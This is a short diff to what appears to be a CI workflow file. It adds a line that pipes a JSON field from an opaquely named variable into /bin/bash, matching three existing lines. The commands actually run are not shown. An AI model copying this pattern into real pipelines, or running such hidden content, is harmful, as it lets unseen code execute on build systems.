@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$jp74961" | jq -r .qbpr16 | /bin/bash
           echo $d57021 | jq -r .gnt5998 | /bin/bash
           printf '%s' "$flza50" | jq -r .q7042 | /bin/bash
+          echo $xg1180 | jq -r .sc2307 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
